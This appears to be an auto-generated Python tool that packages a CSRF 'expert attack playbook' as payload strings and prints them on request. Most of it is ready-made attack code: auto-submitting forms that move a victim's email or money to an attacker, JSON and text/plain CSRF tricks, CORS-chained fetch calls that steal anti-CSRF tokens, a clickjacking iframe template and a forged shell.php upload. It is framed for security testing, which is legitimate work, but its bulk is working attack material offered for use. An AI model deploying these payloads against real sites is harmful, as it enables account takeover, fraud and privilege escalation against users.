#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/csrf-cross-site-request-forgery

Skill: SKILL: CSRF — Cross-Site Request Forgery — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-csrf-cross-site-request-forgery.py --help
      python hack-skills-csrf-cross-site-request-forgery.py --list
      python hack-skills-csrf-cross-site-request-forgery.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/csrf-cross-site-request-forgery'
TITLE = 'SKILL: CSRF — Cross-Site Request Forgery — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: csrf-cross-site-request-forgery", "description: >-", "CSRF testing playbook. Use when reviewing state-changing web flows, anti-CSRF defenses, SameSite behavior, JSON CSRF, login CSRF, and OAuth state handling."],
    'skill-csrf-cross-site-request-forgery-expert-attack-playbook': [],
    '0-related-routing': ["Also load:", "- [cors cross origin misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md) when JSON endpoints become readable cross-origin", "- [oauth oidc misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) when login, account linking, or callback binding relies on OAuth state"],
    '1-core-concept': ["CSRF exploits a victim's active session to perform state-changing requests **from the attacker's origin**.", "**Required conditions**:", "1. Victim is authenticated (active session cookie)", "2. Server identifies session via cookie only (no secondary check)", "3. Attacker can predict/construct the valid request", "4. Cookie is sent cross-origin (SameSite=None or legacy behavior)"],
    '2-finding-csrf-targets': ["**High-value state-changing endpoints**:", "- Password change         \u2190 account takeover", "- Email change            \u2190 account takeover", "- Add admin / change role \u2190 privilege escalation", "- Bank/payment transfer   \u2190 financial impact", "- OAuth app authorization \u2190 hijack oauth flow", "- Account deletion", "- Two-factor auth disable", "- SSH key / API key addition", "- Webhook configuration", "- Profile/contact info update"],
    '3-token-bypass-techniques': [],
    'no-token-present': ["Simplest case \u2014 form simply lacks CSRF token. Check if POST /change-email has any token. If not \u2192 trivially exploitable."],
    'token-not-validated-most-common-finding': ["Token exists in request but is never verified server-side:", "Remove the _csrf_token parameter entirely \u2192 does request still succeed?", "\u2192 YES \u2192 trivial bypass"],
    'token-tied-to-session-but-not-to-user': ["Step 1: Log in as UserA \u2192 obtain valid CSRF token", "Step 2: Log in as UserB in other browser \u2192 obtain UserB CSRF token", "Step 3: Use UserB's CSRF token in UserA's session (attacker controls UserB)", "\u2192 If server validates token exists but doesn't check if it belongs to the session \u2192 bypass"],
    'token-in-cookie-only': ["When server sets CSRF token as cookie and expects it back in a header/form:", "Set-Cookie: csrf=ATTACKER_CONTROLLED", "\u2192 If cookie can be set by subdomain (cookie tossing): set cookie to known value", "\u2192 Submit form with known token in header + known token in cookie = bypass"],
    'static-or-predictable-token': ["\u2192 Same token across all users/sessions", "\u2192 Token = base64(username) or md5(session_id) \u2192 reversible", "\u2192 Token = timestamp \u2192 predictable"],
    'double-submit-cookie-pattern-broken-if-subdomain-trusted': ["If attacker can write cookies for .target.com from subdomain XSS or cookie tossing:", "\u2192 Set csrf_cookie=CONTROLLED on .target.com", "\u2192 Submit request with X-CSRF-Token: CONTROLLED", "\u2192 Server checks header == cookie \u2192 match \u2192 bypass"],
    '4-samesite-bypass-scenarios': ["**SameSite=Lax** (modern browser default): cookies sent for top-level GET navigation, NOT for cross-site iframe/form POST.", "**Bypass SameSite=Lax via GET method**:", "```html", "<!-- If server accepts GET for state-changing endpoint: -->", "<img src=\"https://target.com/account/delete?confirm=yes\">", "<script>document.location = 'https://target.com/transfer?to=attacker&amount=1000';</script>", "**Bypass via subdomain XSS (SameSite Lax/Strict)**:", "```javascript", "// XSS on sub.target.com \u2192 same-site origin \u2192 SameSite cookies sent!", "// Use XSS as staging point for CSRF", "window.location = 'https://target.com/account/modify?evil=true';", "**SameSite=None** (legacy or explicit): cookies sent everywhere \u2192 classic CSRF applies.", "**Cookie issued recently? Lax exemption:**", "Chrome has a 2-minute exception where Lax cookies ARE sent on cross-site POSTs if the cookie was just set (for OAuth flows). Race window: set cookie, immediately trigger CSRF within 2 minutes."],
    '5-csrf-proof-of-concept-templates': [],
    'simple-form-post': ["```html", "<html>", "<body>", "<form id=\"csrf\" action=\"https://target.com/account/email/change\" method=\"POST\">", "<input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\">", "<input type=\"hidden\" name=\"confirm_email\" value=\"attacker@evil.com\">", "</form>", "<script>document.getElementById('csrf').submit();</script>", "</body>", "</html>"],
    'auto-click-submit': ["```html", "<body onload=\"document.forms[0].submit()\">", "<form action=\"https://target.com/transfer\" method=\"POST\">", "<input name=\"to\" value=\"attacker_account\">", "<input name=\"amount\" value=\"10000\">", "</form>", "</body>"],
    'csrf-via-get-with-img-tag': ["```html", "<img src=\"https://target.com/api/v1/admin/delete-user?id=12345\" style=\"display:none\">"],
    'csrf-with-custom-header-xmlhttprequest-same-origin-only-defeats-naive-defenses': ["If API requires custom header like `X-CSRF-Token` but also accepts JSON with wildcard CORS \u2014 custom headers don't protect if CORS misconfigured:", "```javascript", "// If Access-Control-Allow-Origin: * with credentials \u2192 broken", "var xhr = new XMLHttpRequest();", "xhr.open(\"POST\", \"https://target.com/api/transfer\");", "xhr.setRequestHeader(\"Content-Type\", \"application/json\");", "xhr.withCredentials = true;  // still need cookie sending", "xhr.send('{\"to\":\"attacker\",\"amount\":1000}');"],
    '6-json-csrf': ["When endpoint accepts `Content-Type: application/json` \u2014 fetch() with CORS credentials:", "```javascript", "// If CORS allows credentials + the endpoint:", "fetch('https://target.com/api/v1/change-email', {", "method: 'POST',", "credentials: 'include',", "headers: {'Content-Type': 'application/json'},", "body: JSON.stringify({email: 'attacker@evil.com'})", "**Requires**: `Access-Control-Allow-Origin: https://attacker.com` AND `Access-Control-Allow-Credentials: true`", "**If server only accepts `application/json` but no fetch CORS:**", "Can't do proper JSON CSRF from HTML form (forms can only send `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`).", "**Trick \u2014 Content-Type Downgrade**: If server processes `text/plain` body as JSON:", "```html", "<form enctype=\"text/plain\" method=\"POST\" action=\"https://target.com/api\">", "<input name='{\"email\":\"attacker@evil.com\",\"ignore\":\"' value='\"}'>", "</form>", "Resulting body: `{\"email\":\"attacker@evil.com\",\"ignore\":\"=\"}`"],
    '7-multipart-csrf': ["When changing `Content-Type` from `application/json` to `multipart/form-data` and request still works:", "```html", "<form method=\"POST\" action=\"https://target.com/api/update\" enctype=\"multipart/form-data\">", "<input name=\"email\" value=\"attacker@evil.com\">", "</form>"],
    '8-csrf-xss-combination-csrf-token-bypass': ["When CSRF protection is otherwise solid, XSS enables CSRF bypass:", "```javascript", "// Step 1: XSS reads CSRF token from DOM", "var token = document.querySelector('input[name=\"csrf_token\"]').value;", "// Step 2: Submit CSRF request with real token", "var xhr = new XMLHttpRequest();", "xhr.open('POST', '/account/delete', true);", "xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');", "xhr.send('confirm=yes&csrf_token=' + token);"],
    '9-oauth-csrf-state-parameter-missing': ["OAuth flow without `state` parameter \u2192 CSRF on the OAuth authorization:", "**Attack**:", "1. Attacker initiates OAuth flow, gets authorization code", "2. Before exchanging code, stops the flow (captures the redirect URL with code)", "3. Sends victim the crafted URL: `https://target.com/oauth/callback?code=ATTACKER_CODE`", "4. Victim's browser exchanges the attacker's code \u2192 victim's account linked to attacker's OAuth provider", "**Impact**: Attacker can log in as victim."],
    '10-csrf-testing-checklist': ["\u25a1 Remove CSRF token entirely \u2192 does request succeed?", "\u25a1 Change CSRF token to random value \u2192 does request succeed?", "\u25a1 Use CSRF token from another user's session \u2192 does request succeed?", "\u25a1 Check if GET version of POST endpoint exists", "\u25a1 Check SameSite attribute of session cookie", "\u25a1 Test if Content-Type change (json \u2192 form \u2192 text/plain) still processes", "\u25a1 Check CORS policy: does Access-Control-Allow-Credentials: true appear?", "With wildcard or attacker origin? \u2192 exploitable JSON CSRF", "\u25a1 Check OAuth flows for missing state parameter", "\u25a1 Test referrer-based protection: send request with no Referer header", "\u25a1 Test referrer-based protection: spoof subdomain in referer"],
    '11-json-csrf-techniques': [],
    'method-1-text-plain-disguise': ["```html", "<!-- Browser sends Content-Type: text/plain with JSON-like body -->", "<form action=\"https://target.com/api/role\" method=\"POST\" enctype=\"text/plain\">", "<input name='{\"role\":\"admin\",\"ignore\":\"' value='\"}' type=\"hidden\">", "<input type=\"submit\" value=\"Click me\">", "</form>", "<!-- Resulting body: {\"role\":\"admin\",\"ignore\":\"=\"} -->", "<!-- Server may parse as JSON if it doesn't strictly check Content-Type -->"],
    'method-2-xhr-with-credentials': ["```html", "<script>", "var xhr = new XMLHttpRequest();", "xhr.open(\"POST\", \"https://target.com/api/role\", true);", "xhr.withCredentials = true;", "xhr.setRequestHeader(\"Content-Type\", \"application/json\");", "xhr.send('{\"role\":\"admin\"}');", "</script>", "<!-- Only works if CORS allows the origin (misconfigured CORS + CSRF combo) -->"],
    'method-3-fetch-api': ["```html", "<script>", "fetch(\"https://target.com/api/role\", {", "method: \"POST\",", "credentials: \"include\",", "headers: {\"Content-Type\": \"text/plain\"},", "body: '{\"role\":\"admin\"}'", "</script>"],
    '12-multipart-csrf-client-side-path-traversal': [],
    'multipart-file-upload-csrf': ["```html", "<script>", "var formData = new FormData();", "formData.append(\"file\", new Blob([\"malicious content\"], {type: \"text/plain\"}), \"shell.php\");", "formData.append(\"action\", \"upload\");", "fetch(\"https://target.com/upload\", {", "method: \"POST\",", "credentials: \"include\",", "body: formData", "</script>"],
    'client-side-path-traversal-to-csrf-cspt2csrf': ["Normal flow: Frontend fetches /api/user/PROFILE_ID/settings", "Attack: Set PROFILE_ID to ../../admin/dangerous-action", "Result: Frontend's fetch() hits /api/admin/dangerous-action with victim's cookies", "This converts a path traversal into a CSRF-like attack without needing a CSRF token"],
    '13-samesite-lax-advanced-bypass-techniques': [],
    '13-1-top-level-navigation-via-window-open-2-minute-window': ["Chrome's Lax+POST exception: cookies with `SameSite=Lax` are sent on cross-site POST requests if the cookie was set within the last 2 minutes (exists for OAuth flows).", "```javascript", "// Attacker page: trigger login to set a fresh cookie, then immediately CSRF", "// Step 1: Force victim to visit target (sets fresh session cookie)", "window.open('https://target.com/login');", "// Step 2: Within 2 minutes, POST to state-changing endpoint", "setTimeout(() => {", "const form = document.createElement('form');", "form.method = 'POST';", "form.action = 'https://target.com/account/change-email';", "form.innerHTML = '<input name=\"email\" value=\"attacker@evil.com\">';", "document.body.appendChild(form);", "form.submit();", "}, 5000);"],
    '13-2-302-redirect-chain-from-attacker-site': ["Lax cookies are sent on top-level GET navigations. A redirect chain converts GET into action:", "```text", "1. Attacker page \u2192 302 redirect to https://target.com/transfer?to=attacker&amount=1000", "2. Browser follows redirect as top-level navigation \u2192 Lax cookies sent", "3. If target accepts GET for state-changing operations \u2192 CSRF succeeds"],
    '13-3-method-override-post-disguised-as-get': ["Many frameworks support method override via `_method` parameter:", "```text", "GET /account/delete?_method=DELETE&confirm=yes HTTP/1.1", "GET /transfer?_method=POST&to=attacker&amount=1000 HTTP/1.1", "Headers that trigger method override:", "```text", "X-HTTP-Method-Override: POST", "X-Method-Override: DELETE", "_method=PUT (Rails, Laravel, Symfony)", "SameSite=Lax allows the GET \u2192 framework processes it as POST/DELETE via override \u2192 CSRF on \"POST-only\" endpoints."],
    '14-advanced-json-csrf-techniques': [],
    '14-1-flash-based-content-type-manipulation-legacy': ["Flash (pre-2021) could send arbitrary `Content-Type` headers cross-origin without preflight:", "```actionscript", "var req:URLRequest = new URLRequest(\"https://target.com/api/role\");", "req.method = \"POST\";", "req.contentType = \"application/json\";", "req.data = '{\"role\":\"admin\"}';", "navigateToURL(req);", "Legacy but still relevant for older internal applications."],
    '14-2-fetch-no-cors-mode-limitations-and-workarounds': ["`fetch()` in `no-cors` mode can send simple requests but cannot set `Content-Type: application/json` (triggers preflight) or read the response.", "Workaround \u2014 if the server accepts `text/plain` body and parses it as JSON:", "```javascript", "fetch('https://target.com/api/role', {", "method: 'POST',", "mode: 'no-cors',", "credentials: 'include',", "headers: {'Content-Type': 'text/plain'},", "body: '{\"role\":\"admin\"}'"],
    '14-3-encoding-json-as-form-urlencoded': ["Some backends accept both content types:", "```html", "<form action=\"https://target.com/api/role\" method=\"POST\">", "<input name=\"role\" value=\"admin\">", "<input name=\"user_id\" value=\"123\">", "</form>", "If the server processes `role=admin&user_id=123` the same as `{\"role\":\"admin\",\"user_id\":123}` \u2192 CSRF via plain HTML form without CORS preflight."],
    '15-csrf-cors-misconfiguration-chains': [],
    'reflected-origin-credentials': ["```text", "1. Target API reflects Origin in Access-Control-Allow-Origin", "2. Access-Control-Allow-Credentials: true", "3. Attacker page sends credentialed fetch() from https://evil.com", "4. Response is readable \u2192 CSRF token extracted from response", "5. Second request with valid CSRF token \u2192 bypass all CSRF defenses", "```javascript", "fetch('https://target.com/api/profile', {credentials: 'include'})", ".then(r => r.json())", ".then(data => {", "fetch('https://target.com/api/change-email', {", "method: 'POST',", "credentials: 'include',", "headers: {", "'Content-Type': 'application/json',", "'X-CSRF-Token': data.csrf_token", "body: JSON.stringify({email: 'attacker@evil.com'})"],
    'subdomain-xss-cors-csrf': ["If `*.target.com` is in the CORS allowlist and an XSS exists on any subdomain:", "1. Exploit XSS on `blog.target.com`", "2. From XSS context, fetch API at `api.target.com` (CORS allows subdomain)", "3. Read CSRF token from response", "4. Submit state-changing request with valid token"],
    '16-csrf-token-fixation-pre-session-tokens': ["If CSRF tokens are issued before authentication and remain valid after login:", "```text", "1. Attacker visits target.com \u2192 receives CSRF token T1", "2. Attacker forces victim's browser to use T1:", "a. Cookie tossing from subdomain", "b. CRLF injection to set csrf_cookie", "3. Victim logs in \u2014 CSRF token unchanged", "4. Attacker submits CSRF request with known T1 \u2192 succeeds"],
    'test-procedure': ["```text", "\u25a1 Obtain CSRF token as unauthenticated user", "\u25a1 Log in \u2014 does the CSRF token change?", "\u25a1 If unchanged \u2192 token fixation: pre-auth token works post-auth", "\u25a1 Use pre-auth token in a CSRF PoC against authenticated endpoint"],
    '17-clickjacking-as-csrf-bypass': ["When CSRF protections are solid but `X-Frame-Options` / `frame-ancestors` is missing:"],
    'attack-flow': ["```text", "1. Target page is frameable (no X-Frame-Options / CSP frame-ancestors)", "2. Attacker creates transparent iframe overlay", "3. Victim sees attacker content, clicks land on target's action button in hidden iframe", "4. Click originates from same origin (within iframe) \u2014 bypasses CSRF tokens"],
    'poc-template': ["```html", "<html>", "<body>", "<div style=\"position:relative\">", "<iframe src=\"https://target.com/account/settings\"", "style=\"opacity:0.0001; position:absolute; top:0; left:0;", "width:500px; height:500px; z-index:2;\">", "</iframe>", "<button style=\"position:absolute; top:250px; left:200px; z-index:1;", "padding:20px; font-size:24px;\">", "Click to claim prize!", "</button>", "</div>", "</body>", "</html>"],
    'defense-check': ["```text", "\u25a1 X-Frame-Options: DENY or SAMEORIGIN header present?", "\u25a1 CSP: frame-ancestors 'self' or frame-ancestors 'none'?", "\u25a1 If neither \u2192 clickjacking possible \u2192 CSRF bypass via iframe"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()